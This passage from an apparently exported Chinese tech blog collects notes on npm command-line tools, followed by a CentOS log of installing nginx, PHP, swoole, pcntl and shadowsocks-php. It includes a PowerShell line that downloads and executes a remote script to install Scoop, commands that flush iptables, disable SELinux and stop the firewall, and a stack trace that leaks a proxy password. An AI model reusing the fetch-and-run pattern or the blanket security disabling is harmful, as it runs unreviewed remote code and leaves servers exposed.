"\(.key)@\(.value.latest)"' \)) json123456789//https://github.com/antonmedv/fx$ npm install -g fx$ fx data.json$ curl ... | fx 'json =&gt; json.message'$ curl ... | fx '_.groupBy("commit.committer.name")' '_.mapValues(_.size)'$ echo '&#123;"count": 0&#125;' | fx '&#123;...this, count: 1&#125;'&#123; "count": 1&#125; 查看 Git 文件变动历史12345678910111213https://github.com/pomber/git-history文件地址 https://github.com/babel/babel/blob/master/packages/babel-core/test/browserify.js将域名github.com 改为github.githistory.xyzhttps://github.githistory.xyz/babel/babel/blob/master/packages/babel-core/test/browserify.js$ npm install -g git-file-history$ git-file-history path/to/file.extRunning at http://localhost:3000npx git-file-history path/to/file.extnpx: installed 1 in 2.406sPath must be a string. Received undefinedC:\Users\xxx\AppData\Roaming\npm\node_modules\git-file-history\cli.jsRunning at http://localhost:3000 中文加空格123456 npm install -g panguC:\Users\xxx\AppData\Roaming\npm\pangu -&gt; C:\Users\xxx\AppData\Roaming\npm\node_modules\pangu\dist\node\cli.js+ pangu@4.0.7added 1 package in 3.207spangu "不能信任那些Terminal或Editor用白底的人"不能信任那些 Terminal 或 Editor 用白底的人 网页截图123456789101112λ npm install --global capture-website-cliC:\Users\xxx\AppData\Roaming\npm\capture-website -&gt; C:\Users\xxx\AppData\Roaming\npm\node_modules\capture-website-cli\cli.js&gt; puppeteer@1.12.2 install C:\Users\xxx\AppData\Roaming\npm\node_modules\capture-website-cli\node_modules\puppeteer&gt; node install.jsDownloading Chromium r624492 - 140.5 Mb [====================] 100% 0.0sChromium downloaded to C:\Users\xxx\AppData\Roaming\npm\node_modules\capture-website-cli\node_modules\puppeteer\.local-chromium\win64-624492+ capture-website-cli@0.1.1added 98 packages in 37.927scapture-website https://baidu.com baidu.pngcapture-website test.html test.png stackoverflow from the terminal123456npm install -g how-2 #https://github.com/santinic/how2how2 unzipFor example, you could alias the proxy seetings in your ~/.bash_profile:alias how2="HTTPS_PROXY='your_proxy:8888' how2" ppt转图片12345678910111213141516171819202122232425262728293031323334353637//http://blog.51yip.com/jsjquery/1924.htmlapt install nodejs npm unoconv libreoffice-dev imagemagick # nodejs init //产生package.json # npm install ppt2png root@bacon-PC:~# cat test.js var ppt2png = require('ppt2png'); var ppt = process.argv[2]; var topath = process.argv[3]; ppt2png(ppt, topath, function( err )&#123; if(err) &#123; console.log(err); &#125; else &#123; console.log('convert successful.'); &#125; &#125;); # nodejs test.js test.pptx ./test/hao convert successful. # ls ./test |grep hao hao-0.png hao-10.png hao-11.png hao-12.png hao-13.png hao-14.png hao-15.png hao-16.png hao-17.png hao-1.png hao-2.png hao-3.png hao-4.png hao-5.png hao-6.png hao-7.png hao-8.png hao-9.png FFmpeg12345678910111213141516ffmpeg -i imput.mkv -c:v libx264 output.mp4查看视频文件的流信息，包括视频、音频、字幕。ffmpeg -i input.mkvmkv 文件剪辑，截取片段，指定音轨。https://www.playpi.org/2019032701.html-- -ss 表示开始时间，-to 表示结束时间，ffmpeg -ss 01:22:08 -to 01:32:16 -accurate_seek -i in.mkv -map 0:v -map 0:a:1 -codec copy -avoid_negative_ts 1 out.mkv-- 视频使用 h264 编码，音频使用 aac 编码 ffmpeg -i input.rmvb -c:v h264 -c:a aac out.mp4给视频添加水印https://www.njphper.com/posts/2ffce39e.html// ffmpeg -i birds.mp4 -i watermark.png -filter_complex "overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2" birds2.mp4 ffmpeg -i birds.mp4 -i watermark2.png-filter_complex "pad=height=ih+40:color=#71cbf4,overlay=(main_w-overlay_w)/2:main_h-overlay_h"birds3.mp4ffmpeg -i yii.mp4 -i logo.jpg -strict -2 -filter_complex "overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2" birds2.mp4 AnyProxy简介移动端抓包工具1234567891011121314151617npm install -g anyproxy~ anyproxy[AnyProxy Log][2018-12-26 11:42:19]: Http proxy started on port 8001[AnyProxy Log][2018-12-26 11:42:19]: web interface started on port 8002// 稳定版本生成方法~ sudo anyproxy --root// 最新版本生成方法~ anyproxy-ca支持 Https 方式重新启动 AnyProxy ~ anyproxy --intercept// 简写~ anyproxy -ihttps://duanruilong.github.io/blog/2018/12/26/AnyProxy%E7%AE%80%E4%BB%8B%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/ docsify123456789101112npm i docsify-cli -gdocsify init ./docs初始化成功后，可以看到 ./docs 目录下创建的几个文件index.html 入口文件README.md 会做为主页内容渲染.nojekyll 用于阻止 GitHub Pages 会忽略掉下划线开头的文件直接编辑 docs/README.md 就能更新网站内容，当然也可以写多个页面本地服务器通过 docsify serve 可以方便的预览效果，而且提供 LiveReload 功能，可以让实时的预览。默认访问 http://localhost:3000 。https://duanruilong.github.io/blog/2019/03/14/docsify%E7%A5%9E%E5%A5%87%E7%9A%84%E6%96%87%E6%A1%A3%E7%BD%91%E7%AB%99%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/ https://www.bbsmax.com/A/A7zgplD1J4/ 终端代码生成好看的图片123456789101112npm i -g carbon-now-clihttps://github.com/mixn/carbon-now-cli$ carbon-now --helpBeautiful images of your code — from right inside your terminal.Usage $ carbon-now &lt;file&gt; $ pbpaste | carbon-now $ carbon-now --from-clipboard $ carbon-now unfold.js Takes the entire source of unfold.js, uses Carbon’s default settings and saves as .png into your cwd. 网页成为桌面应用程序12npm install nativefier -gnativefier --name "LearnKu" "https://learnku.com" 网页保存成 PDF123456789101112131415 https://github.com/danburzo/percollate npm install -g percollateTo transform a single web page to PDF:percollate pdf --output some.pdf https://example.comTo bundle several web pages into a single PDF, specify them as separate arguments to the command:percollate pdf --output some.pdf https://example.com/page1 https://example.com/page2You can use common Unix commands and keep the list of URLs in a newline-delimited text file:cat urls.txt | xargs percollate pdf --output some.pdfTo transform several web pages into individual PDF files at once, use the --individual flag:percollate pdf --individual https://example.com/page1 https://example.com/page2https://www.sejda.com/html-to-pdf 命令行截图123456789npm i -g screenshoteerYou can use screenshoteer like this:screenshoteer --url https://www.example.comor .html localy copy the url path from the browserscreenshoteer --url file:///Users/../index.htmlscreenshoteer --url file:///C:/Users/../Random-HTML-file.html 任意网站变成桌面软件1234npm i -g nativefiernativefier "https://segmentfault.com"nativefier --name "SegmentFault" "https://segmentfault.com/"https://segmentfault.com/a/1190000012924855 windows scoop12345678910在 PowerShell 中输入下面内容，保证允许本地脚本的执行：set-executionpolicy remotesigned -scope currentuser执行下面的命令安装 Scoop：iex (new-object net.webclient).downloadstring('https://get.scoop.sh')scoop search gitscoop install githttps://laravelcode.cn/posts/98/scoop-installation-and-use gitbook1234567891011121314151617λ npm install -g gitbook-clinpm ERR! path C:\Users\xxx\AppData\Roaming\npm\node_modules\gitbook-cli\node_modules\npmi\node_modules\npm\node_modules\ansistylesnpm ERR! code ENOENTnpm ERR! errno -4058npm ERR! syscall renamenpm ERR! enoent ENOENT: no such file or directory, rename 'C:\Users\xxx\AppData\Roaming\npm\node_modules\gitbook-cli\node_modules\npmi\node_modules\npm\node_modules\ansistyles' -&gt; 'C:\Users\xxx\AppData\Roaming\npm\node_modules\gitbook-cli\node_modules\npmi\node_modules\npm\node_modules\.ansistyles.DELETE'npm ERR! enoent This is related to npm not being able to find a file.npm ERR! enoentnpm ERR! A complete log of this run can be found in:npm ERR! C:\Users\xxx\AppData\Roaming\npm-cache\_logs\2019-12-17T07_10_31_419Z-debug.log删除这个目录 C:\Users\xxx\AppData\Roaming\npm\node_modules\gitbook-cli\node_modulesλ npm install -g gitbook-cliC:\Users\xxx\AppData\Roaming\npm\gitbook -&gt; C:\Users\xxx\AppData\Roaming\npm\node_modules\gitbook-cli\bin\gitbook.js+ gitbook-cli@2.3.2added 577 packages and updated 1 package in 33.056s 使用tree生成目录树12345678910111213141516171819202122npm install -g tree-node-cliC:\Users\xxx\AppData\Roaming\npm\treee -&gt; C:\Users\xxx\AppData\Roaming\npm\node_modules\tree-node-cli\bin\tree.jsC:\Users\xxx\AppData\Roaming\npm\tree -&gt; C:\Users\xxx\AppData\Roaming\npm\node_modules\tree-node-cli\bin\tree.js+ tree-node-cli@1.2.5added 2 packages in 2.572stree --helpUsage: tree [options]Options: -V, --version output the version number -a, --all-files All files, include hidden files, are printed. --dirs-first List directories before files. -d, --dirs-only List directories only. -I, --exclude [patterns] Exclude files that match the pattern. | separates alternate patterns. Wrap your entire pattern in double quotes. E.g. `"node_modules|coverage". -L, --max-depth &lt;n&gt; Max display depth of the directory tree. -r, --reverse Sort the output in reverse alphabetic order. -F, --trailing-slash Append a '/' for directories. -h, --help output usage information tree -L 3 -I "vendor" &gt; tree.md https://hanyajun.com/tools/windows_tree_skill/ 链接：https://hanyajun.com/tools/windows_tree_skill/来源：hanyajun.com ss json cli 命令行：增强版 SQL 书写 + 视窗组件绑定 + 流程配置 使用Gitbook编写书籍文档 天气查询 命令行终端控制转义序列 Nodejs多版本切换https://tingtas.com/posts/2ec3f20f/]]></content>
      <tags>
        <tag>命令行</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多版本php]]></title>
    <url>%2F2018%2F11%2F28%2F%E5%A4%9A%E7%89%88%E6%9C%ACphp%2F</url>
    <content type="text"><![CDATA[安装nginx123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687yum list | grep nginxyum -y install nginxiptables -Fsetenforce 0systemctl start nginx#自己编译## 下载nginx安装包，版本根据自己需求自己替换wget http://nginx.org/download/nginx-1.10.3.tar.gz## 解压缩tar -xvf nginx-1.10.3.tar.gz## 进入解压后的目录cd nginx-1.10.3## 安装nginx所需功能yum install -y pcre-devel openssl openssl-devel## 配置信息，--prefix为安装文件的目录./configure --prefix=/usr/local/nginx --with-http_ssl_module --with-http_realip_module --with-http_addition_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_random_index_module --with-http_secure_link_module --with-http_stub_status_module --with-http_auth_request_module --with-threads --with-stream --with-stream_ssl_module --with-http_slice_module --with-mail --with-mail_ssl_module --with-file-aio --with-http_v2_module --with-ipv6 --with-pcre## 编译和安装make &amp;&amp; make install## 将nginx加入到systemctl中vi /usr/lib/systemd/system/nginx.service## 配置信息[Unit]Description=nginx.serviceAfter=network.target[Service]Type=forkingExecStart=/usr/local/nginx/sbin/nginxExecReload=/usr/local/nginx/sbin/nginx -s reloadExecStop=/usr/local/nginx/sbin/nginx -s stopPrivateTmp=true[Install]WantedBy=multi-user.target## 更改/etc/profile文件vim /etc/profile## 配置信息，在文件末尾加入下面语句，多个环境变量用:隔开export PATH=$PATH:/usr/local/nginx/sbin## 每次配置nginx后检查是否配置成功nginx -t## 重启nginxnginx -s reload## systemctl命令## 开机启动systemctl enable *.service## 取消开机启动systemctl disable *.service## 启动systemctl start *.service## 停止systemctl stop *.service## 1 若 nginx 启动成功，但浏览器无法访问，关闭防火墙，或开启相应端口## 关闭防火墙service firewalld stopfirewall-cmd --zone=public --add-port=80/tcp --permanent#需要重启防火墙生效 很重要service firewalld restart# or service firewalld stopservice firewalld startFast-CGI 模块是 Nginx 的一个模块，用于与 Fast-CGI 程序通信。一般PHP-FPM进程占用20~30m左右的内存就按30m算物理内存 / 30M如果单机不仅仅跑了PHP-FPM，建议留一半给PHP物理内存 / 2 / 30MPHP-FPM = PHP FastCGI Process Manager，用于启动并管理 PHP 进程且提供 Fast-CGI 接口，能够和 Nginx 的 Fast-CGI 模块通信。避免泛解析 总有些人会把域名解析错地址或者是恶意解析到你的服务器上。对于这种人必须严惩 server &#123; listen 80 default_server; server_name _; return 403; &#125; 安装php712345rpm -ivh https://mirror.webtatic.com/yum/el7/webtatic-release.rpmyum list | grep phpyum -y install mod_php70w php70w-cli php70w-fpm php70w-common php70w-develsystemctl restart nginxsystemctl start php-fpm 安装PHP7.212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788//下载php的安装文件wget http://cn2.php.net/distributions/php-7.2.3.tar.gz//解压tar zxvf php-7.2.3.tar.gz//进入解压后的目录cd php-7.2.3//配置安装参数./configure --enable-fpm --prefix=/usr/local/php//编译安装make &amp;&amp; make install/bin/sh /root/php-7.2.3/libtool --silent --preserve-dup-deps --mode=compile cc -I/root/php-7.2.3/ext/fileinfo/libmagic -Iext/fileinfo/ -I/root/php-7.2.3/ext/fileinfo/ -DPHP_ATOM_INC -I/root/php-7.2.3/include -I/root/php-7.2.3/main -I/root/php-7.2.3 -I/root/php-7.2.3/ext/date/lib -I/usr/include/libxml2 -I/root/php-7.2.3/ext/sqlite3/libsqlite -I/root/php-7.2.3/TSRM -I/root/php-7.2.3/Zend -I/usr/include -g -O2 -fvisibility=hidden -DZEND_SIGNALS -c /root/php-7.2.3/ext/fileinfo/fileinfo.c -o ext/fileinfo/fileinfo.lo/bin/sh /root/php-7.2.3/libtool --silent --preserve-dup-deps --mode=compile cc -I/root/php-7.2.3/ext/fileinfo/libmagic -Iext/fileinfo/ -I/root/php-7.2.3/ext/fileinfo/ -DPHP_ATOM_INC -I/root/php-7.2.3/include -I/root/php-7.2.3/main -I/root/php-7.2.3 -I/root/php-7.2.3/ext/date/lib -I/usr/include/libxml2 -I/root/php-7.2.3/ext/sqlite3/libsqlite -I/root/php-7.2.3/TSRM -I/root/php-7.2.3/Zend -I/usr/include -g -O2 -fvisibility=hidden -DZEND_SIGNALS -c /root/php-7.2.3/ext/fileinfo/libmagic/apprentice.c -o ext/fileinfo/libmagic/apprentice.locc: internal compiler error: Killed (program cc1)Please submit a full bug report,with preprocessed source if appropriate.See &lt;http://bugzilla.redhat.com/bugzilla&gt; for instructions.make: *** [ext/fileinfo/libmagic/apprentice.lo] Error 1找到问题了,大体上是因为内存不足,临时使用交换分区来解决吧sudo dd if=/dev/zero of=/swapfile bs=64M count=16sudo mkswap /swapfilesudo swapon /swapfile编译完成，可以取消交换分区：sudo swapoff /swapfilesudo rm /swapfile错误 ： configure: error: libxml2 not found. Please check your libxml2 installationyum install -y libxml2 libxml2-develcp php.ini-development /usr/local/php/lib/php.inicp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.confcp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf[root@VM_0_14_centos swoole-src]# lsof -i:9000COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEdocker-pr 30650 root 4u IPv6 1319116 0t0 TCP *:cslistener (LISTEN)vi /usr/local/php/etc/php-fpm.d/www.conflisten=127.0.0.1:9005[root@VM_0_14_centos shadowsocks-php]# ps axu|grep fpmroot 575 0.0 0.0 4616 8 ? Ss Nov12 0:00 /bin/sh -c /usr/bin/php-fpmroot 653 0.0 0.0 18364 0 ? S Nov12 0:00 bash /usr/bin/php-fpmroot 654 0.0 0.0 515736 960 ? Ss Nov12 1:52 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)33 2156 0.0 0.2 380220 4840 ? S Nov08 0:05 php-fpm: pool www33 10893 0.0 0.2 380220 4836 ? S Nov16 0:04 php-fpm: pool wwwroot 12044 0.0 0.2 150952 4380 ? Ss Nov28 0:26 php-fpm: master process (/usr/local/php/etc/php-fpm.conf)nobody 12045 0.0 0.2 153100 4536 ? S Nov28 0:00 php-fpm: pool wwwnobody 12046 0.0 0.2 153100 4292 ? S Nov28 0:00 php-fpm: pool www[root@VM_0_14_centos shadowsocks-php]# lsof -i:9005COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEphp-fpm 12044 root 7u IPv4 24140471 0t0 TCP VM_0_14_centos:9005 (LISTEN)php-fpm 12045 nobody 0u IPv4 24140471 0t0 TCP VM_0_14_centos:9005 (LISTEN)php-fpm 12046 nobody 0u IPv4 24140471 0t0 TCP VM_0_14_centos:9005 (LISTEN)#/usr/local/php/sbin/php-fpm#重启fpm# cat fpm_restart.sh#! /bin/bashPIDS=`ps aux | grep fpm | grep php | awk '&#123;print $2&#125;'`for PID in $PIDSdo kill -9 $PIDdone/usr/local/php/sbin/php-fpm#vi /etc/nginx/nginx.confroot /usr/share/nginx/html;location ~* \.php$ &#123; fastcgi_index index.php; fastcgi_pass 127.0.0.1:9000; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name;&#125;#service nginx restart[root@VM_0_14_centos php-7.2.3]# mv /usr/bin/php /usr/bin/php7[root@VM_0_14_centos php-7.2.3]# php7 -vPHP 7.0.32 (cli) (built: Sep 15 2018 07:54:46) ( NTS )Copyright (c) 1997-2017 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.32, Copyright (c) 1999-2017, by Zend Technologies[root@VM_0_14_centos php-7.2.3]# ln -s /usr/local/php/bin/php /usr/bin/php[root@VM_0_14_centos php-7.2.3]# php -vPHP 7.2.3 (cli) (built: Nov 28 2018 12:05:00) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies php-fpm管理器添加到systemctl系统服务中1234567891011121314151617181920212223242526272829303132333435363738394041424344## 编辑文件vi /usr/lib/systemd/system/php-fpm.service## 配置内容[Unit]Description=The PHP FastCGI Process ManagerAfter=syslog.target network.target[Service]Type=simplePIDFile=/run/php-fpm.pidExecStart=/usr/local/php7/sbin/php-fpm --nodaemonize --fpm-config /usr/local/php7/etc/php-fpm.confExecReload=/bin/kill -USR2 $MAINPIDExecStop=/bin/kill -SIGINT $MAINPID[Install]WantedBy=multi-user.target$MAINPID 是特殊环境变量，表示主进程,比如这里 php-fpm 的主进程为 7，$MAINPID 就为 7## 开机运行服务systemctl enable php-fpm.service## 取消开机运行systemctl disable php-fpm.service## 启动服务systemctl start php-fpm.service## 停止服务systemctl stop php-fpm.service## 重启服务systemctl restart php-fpm.service## 重新加载服务配置文件systemctl reload php-fpm.service## 查询服务运行状态systemctl status php-fpm.service## 显示启动失败的服务systemctl --failedfirewall-cmd --zone=public --add-port=xx/tcp --permanent#需要重启生效 很重要 安装swoole123456789101112131415161718192021222324252627282930313233343536373839404142434445[root@VM_0_14_centos html]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core)[root@VM_0_14_centos html]# pecl install swooleCould not download from "http://pecl.php.net/get/swoole-4.2.7.tgz", cannot download "pecl/swoole" (File http://pecl.php.net:80/get/swoole-4.2.7.tgz not valid (received: HTTP/1.0 500 Internal Server Error))Error: cannot download "pecl/swoole"Download failedinstall failed#git clone https://github.com/swoole/swoole-src#cd swoole-src#phpize #./configurechecking for gcc... nochecking for cc... nochecking for cl.exe... noconfigure.sh:error:no acceptable C compiler found in $PATHSee 'config.log' for more details#yum install glibc-headers gcc-c++#yum -y install gcc#./configure --with-php-config=/usr/local/php/bin/php-configchecking how to run the C++ preprocessor... /lib/cppconfigure: error: C++ preprocessor "/lib/cpp" fails sanity checkSee `config.log' for more details.Build complete.Don't forget to run 'make test'.Installing shared extensions: /usr/lib64/php/modules/Installing header files: /usr/include/php/#make &amp;&amp; make install#vi /etc/php.iniextension= /usr/lib64/php/modules/swoole.so[root@VM_0_14_centos swoole-src]# php -mPHP Warning: PHP Startup: Unable to load dynamic library '/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so' (tried: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so (/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so: undefined symbol: spl_ce_Countable), /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718//usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so.so (/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718//usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library '/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so' (tried: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so (/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so: undefined symbol: spl_ce_Countable), /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718//usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so.so (/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718//usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/swoole.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0请检测编译swoole.so使用的PHP版本，和运行的是否一致https://github.com/swoole/swoole-src/issues/1441[root@VM_0_14_centos swoole-src]# /usr/local/php/bin/phpizeConfiguring for:PHP Api Version: 20170718Zend Module Api No: 20170718Zend Extension Api No: 320170718 安装其他扩展看到一个php的ss项目 https://github.com/walkor/shadowsocks-php ，需要安装pcntl#进入PHP源码目录cd /root/php-7.2.3/ext/pcntllldrwxrwxr-x 4 root root 4096 Feb 28 2018 bcmathdrwxrwxr-x 3 root root 4096 Feb 28 2018 bz2drwxrwxr-x 3 root root 4096 Feb 28 2018 calendardrwxrwxr-x 3 root root 4096 Feb 28 2018 com_dotnetdrwxrwxr-x 4 root root 4096 Nov 28 11:27 ctypedrwxrwxr-x 3 root root 4096 Feb 28 2018 curldrwxrwxr-x 5 root root 4096 Nov 28 11:24 datedrwxrwxr-x 6 root root 4096 Feb 28 2018 dbadrwxrwxr-x 5 root root 4096 Nov 28 11:27 domdrwxrwxr-x 4 root root 4096 Feb 28 2018 enchantdrwxrwxr-x 3 root root 4096 Feb 28 2018 exif[root@VM_0_14_centos pcntl]# /usr/local/php/bin/phpizeConfiguring for:PHP Api Version: 20170718Zend Module Api No: 20170718Zend Extension Api No: 320170718[root@VM_0_14_centos pcntl]# ./configure --with-php-config=/usr/local/php/bin/php-configchecking for grep that handles long lines and -e... /usr/bin/grepchecking for egrep... /usr/bin/grep -Echecking for a sed that does not truncate output... /usr/bin/sedchecking for cc... ccchecking whether the C compiler works... yeschecking for C compiler default output file name... a.outchecking for suffix of executables...checking whether we are cross compiling... nochecking for suffix of object files... ochecking whether we are using the GNU C compiler... yes[root@VM_0_14_centos pcntl]# make &amp;&amp; make install/bin/sh /root/php-7.2.3/ext/pcntl/libtool --mode=compile cc -DHAVE_STRUCT_SIGINFO_T -I. -I/root/php-7.2.3/ext/pcntl -DPHP_ATOM_INC -I/root/php-7.2.3/ext/pcntl/include -I/root/php-7.2.3/ext/pcntl/main -I/root/php-7.2.3/ext/pcntl -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -c /root/php-7.2.3/ext/pcntl/pcntl.c -o pcntl.lomkdir .libs cc -DHAVE_STRUCT_SIGINFO_T -I. -I/root/php-7.2.3/ext/pcntl -DPHP_ATOM_INC -I/root/php-7.2.3/ext/pcntl/include -I/root/php-7.2.3/ext/pcntl/main -I/root/php-7.2.3/ext/pcntl -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -c /root/php-7.2.3/ext/pcntl/pcntl.c -fPIC -DPIC -o .libs/pcntl.o/bin/sh /root/php-7.2.3/ext/pcntl/libtool --mode=compile cc -DHAVE_STRUCT_SIGINFO_T -I. -I/root/php-7.2.3/ext/pcntl -DPHP_ATOM_INC -I/root/php-7.2.3/ext/pcntl/include -I/root/php-7.2.3/ext/pcntl/main -I/root/php-7.2.3/ext/pcntl -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -c /root/php-7.2.3/ext/pcntl/php_signal.c -o php_signal.lo cc -DHAVE_STRUCT_SIGINFO_T -I. -I/root/php-7.2.3/ext/pcntl -DPHP_ATOM_INC -I/root/php-7.2.3/ext/pcntl/include -I/root/php-7.2.3/ext/pcntl/main -I/root/php-7.2.3/ext/pcntl -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -c /root/php-7.2.3/ext/pcntl/php_signal.c -fPIC -DPIC -o .libs/php_signal.o/bin/sh /root/php-7.2.3/ext/pcntl/libtool --mode=link cc -DPHP_ATOM_INC -I/root/php-7.2.3/ext/pcntl/include -I/root/php-7.2.3/ext/pcntl/main -I/root/php-7.2.3/ext/pcntl -I/usr/local/php/include/php -I/usr/local/php/include/php/main -I/usr/local/php/include/php/TSRM -I/usr/local/php/include/php/Zend -I/usr/local/php/include/php/ext -I/usr/local/php/include/php/ext/date/lib -DHAVE_CONFIG_H -g -O2 -o pcntl.la -export-dynamic -avoid-version -prefer-pic -module -rpath /root/php-7.2.3/ext/pcntl/modules pcntl.lo php_signal.locc -shared .libs/pcntl.o .libs/php_signal.o -Wl,-soname -Wl,pcntl.so -o .libs/pcntl.socreating pcntl.la(cd .libs &amp;&amp; rm -f pcntl.la &amp;&amp; ln -s ../pcntl.la pcntl.la)/bin/sh /root/php-7.2.3/ext/pcntl/libtool --mode=install cp ./pcntl.la /root/php-7.2.3/ext/pcntl/modulescp ./.libs/pcntl.so /root/php-7.2.3/ext/pcntl/modules/pcntl.socp ./.libs/pcntl.lai /root/php-7.2.3/ext/pcntl/modules/pcntl.laPATH="$PATH:/sbin" ldconfig -n /root/php-7.2.3/ext/pcntl/modules----------------------------------------------------------------------Libraries have been installed in: /root/php-7.2.3/ext/pcntl/modulesIf you ever happen to want to link against installed librariesin a given directory, LIBDIR, you must either use libtool, andspecify the full pathname of the library, or use the `-LLIBDIR'flag during linking and do at least one of the following: - add LIBDIR to the `LD_LIBRARY_PATH' environment variable during execution - add LIBDIR to the `LD_RUN_PATH' environment variable during linking - use the `-Wl,--rpath -Wl,LIBDIR' linker flag - have your system administrator add LIBDIR to `/etc/ld.so.conf'See any operating system documentation about shared libraries formore information, such as the ld(1) and ld.so(8) manual pages.----------------------------------------------------------------------Build complete.Don't forget to run 'make test'.Installing shared extensions: /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/[root@VM_0_14_centos pcntl]# vi /usr/local/php/lib/php.iniextension=/usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/pcntl.so[root@VM_0_14_centos pcntl]# php -m|grep pcntlpcntl#git clone https://github.com/walkor/shadowsocks-php#cd shadowsocks-php#[root@VM_0_14_centos shadowsocks-php]# php start.php start -d PHP Warning: require_once(/root/shadowsocks-php/Workerman/Autoloader.php): failed to open stream: No such file or directory in /root/shadowsocks-php/start.php on line 24 Warning: require_once(/root/shadowsocks-php/Workerman/Autoloader.php): failed to open stream: No such file or directory in /root/shadowsocks-php/start.php on line 24 PHP Fatal error: require_once(): Failed opening required '/root/shadowsocks-php/Workerman/Autoloader.php' (include_path='.:/usr/local/php/lib/php') in /root/shadowsocks-php/start.php on line 24 Fatal error: require_once(): Failed opening required '/root/shadowsocks-php/Workerman/Autoloader.php' (include_path='.:/usr/local/php/lib/php') in /root/shadowsocks-php/start.php on line 24 [root@VM_0_14_centos shadowsocks-php]# cd Workerman/ [root@VM_0_14_centos Workerman]# ll total 0 [root@VM_0_14_centos shadowsocks-php]# rm -rf Workerman/ [root@VM_0_14_centos shadowsocks-php]# git clone https://github.com/walkor/Workerman Cloning into 'Workerman'... remote: Enumerating objects: 15, done. remote: Counting objects: 100% (15/15), done. remote: Compressing objects: 100% (15/15), done. remote: Total 5947 (delta 5), reused 1 (delta 0), pack-reused 5932 Receiving objects: 100% (5947/5947), 2.14 MiB | 713.00 KiB/s, done. Resolving deltas: 100% (3415/3415), done. [root@VM_0_14_centos shadowsocks-php]# php start.php start -d Workerman[start.php] start in DAEMON mode ------------------------------------------- WORKERMAN ------------------------------------------- Workerman version:3.5.16 PHP version:7.2.3 -------------------------------------------- WORKERS -------------------------------------------- proto user worker listen processes status tcp root shadowsocks-server tcp://0.0.0.0:443 12 [OK] udp root shadowsocks-server udp://0.0.0.0:443 12 [OK] ------------------------------------------------------------------------------------------------- Input "php start.php stop" to stop. Start success.# tail -f workerman.log2018-12-10 14:04:56 pid:2596 Worker[2596] process terminated2018-12-10 14:04:56 pid:32505 worker[shadowsocks-server:2596] exit with status 640002018-12-10 14:04:56 pid:2595 Error: Call to undefined function openssl_random_pseudo_bytes() in /root/shadowsocks-php/Applications/Shadowsocks/Encryptor.php:65Stack trace:#0 /root/shadowsocks-php/Applications/Shadowsocks/server.php(53): Encryptor-&gt;__construct('susheng', 'aes-256-cfb')#1 [internal function]: &#123;closure&#125;(Object(Workerman\Connection\TcpConnection))#2 /root/shadowsocks-php/Workerman/Worker.php(2388): call_user_func(Object(Closure), Object(Workerman\Connection\TcpConnection))#3 [internal function]: Workerman\Worker-&gt;acceptConnection(Resource id #15)#4 /root/shadowsocks-php/Workerman/Events/Select.php(294): call_user_func_array(Array, Array)#5 /root/shadowsocks-php/Workerman/Worker.php(2321): Workerman\Events\Select-&gt;loop()#6 /root/shadowsocks-php/Workerman/Worker.php(1452): Workerman\Worker-&gt;run()#7 /root/shadowsocks-php/Workerman/Worker.php(1282): Workerman\Worker::forkOneWorkerForLinux(Object(Workerman\Worker))#8 /root/shadowsocks-php/Workerman/Worker.php(1256): Workerman\Worker::forkWorkersForLinux()#9 